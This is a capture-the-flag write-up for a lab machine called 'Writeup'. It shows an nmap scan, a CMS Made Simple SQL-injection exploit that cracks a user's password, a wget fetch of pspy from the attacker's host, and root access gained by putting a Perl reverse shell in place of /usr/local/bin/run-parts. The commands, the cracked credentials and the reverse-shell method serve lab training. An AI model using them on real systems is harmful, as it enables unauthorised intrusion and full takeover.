# Writeup

Status: closed

Target IP: 10.10.10.138

## Information gathering
### NMAP
```sh
➜  ~ nmap -T4 -sS -Pn -sC -sV 10.10.10.138
Starting Nmap 7.80 ( https://nmap.org ) at 2019-09-29 16:07 CEST
Nmap scan report for 10.10.10.138
Host is up (0.023s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 dd:53:10:70:0b:d0:47:0a:e2:7e:4a:b6:42:98:23:c7 (RSA)
|   256 37:2e:14:68:ae:b9:c2:34:2b:6e:d9:92:bc:bf:bd:28 (ECDSA)
|_  256 93:ea:a8:40:42:c1:a8:33:85:b3:56:00:62:1c:a0:ab (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
| http-robots.txt: 1 disallowed entry 
|_/writeup/
|_http-title: Nothing here yet.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.48 seconds
```


Open http://10.10.10.138/ the page shows:
```
########################################################################
#                                                                      #
#           *** NEWS *** NEWS *** NEWS *** NEWS *** NEWS ***           #
#                                                                      #
#   Not yet live and already under attack. I found an   ,~~--~~-.      #
#   Eeyore DoS protection script that is in place and   +      | |\    #
#   watches for Apache 40x errors and bans bad IPs.     || |~ |`,/-\   #
#   Hope you do not get hit by false-positive drops!    *\_) \_) `-'   #
#                                                                      #
#   If you know where to download the proper Donkey DoS protection     #
#   please let me know via mail to jkr@writeup.htb - thanks!           #
#                                                                      #
########################################################################
```

Keep in mind target email `jkr@writeup.htb` and username `jkr`.

Open  http://10.10.10.138/writeup/ and inspecting the page header contain:

```html
<meta name="Generator" content="CMS Made Simple - Copyright (C) 2004-2019. All rights reserved.">
```

so the CMS used is *"CMS Made Simple"*.

## Vulnerability analysis and penetration test
### Exploit
I had search on exploit DB "CMS Made Simple" and try first one [CMS Made Simple < 2.2.10 - SQL Injection](https://www.exploit-db.com/exploits/46635).
```sh
➜  ~ python 46635.py -u http://10.10.10.138/writeup --crack -w /usr/share/wordlists/rockyou.txt 
waiting...
[+] Salt for password found: 5a599ef579066807
[+] Username found: jkr
[+] Email found: jkr@writeup.htb
[+] Password found: 62def4866937f08cc13bab43bb14e6f7
[+] Password cracked: raykayjay9
```

I am logged in via SSH with user `jkr` and password `raykayjay9` 🥁
```sh
ssh jkr@10.10.10.138
```

N.B.
- `/root`, `/usr/local/bin`, `/usr/local/sbin` ... folder have permission `drwx------   4 root root` and I don't access it with sudo
- I don't see any useful processes

### Privilege escaletion
I had use [`pspy`](https://github.com/DominicBreuker/pspy) to monitor linux processes without permissions, upload bin using `scp` command or creating http server on local machine as a follow
```sh
➜ ~ ls
pspy64

➜ ~ python -m SimpleHTTPServer 
Serving HTTP on 0.0.0.0 port 8000 ...

➜ ~ ifconfig 
...
tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
        inet <LOCAL_IP>  netmask 255.255.252.0  destination <LOCAL_IP>
...
```

and on target machine run:
```sh
jkr@writeup:~$ wget <LOCAL_IP>:8000/pspy64
jkr@writeup:~$ chmod +x pspy64 
jkr@writeup:~$ ./pspy64
```

Several Perl processes are scheduled with `root` perm (eg. `/root/bin/cleanup.pl` or `/usr/local/sbin/run-parts`), I had load a reverse shell script in Perl and replaced it with one of them. Before that I had create arbitrary TCP and UDP connections and listens running the netcat command as a follow
```sh
➜ ~ nc -lvp 1234
```

I used [this](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) perl script.
Update perl script into target host and run
```sh
jkr@writeup:~$ cp perl-reverse-shell2.ples /usr/local/bin/run-parts
jkr@writeup:~$ chmod +x /usr/local/bin/run-parts
```
exit and relogged in via, the scrpt run-parts will relaunched.

Locally using reverse shell enter in `root` and cat `root.txt` to capture the flag 🚩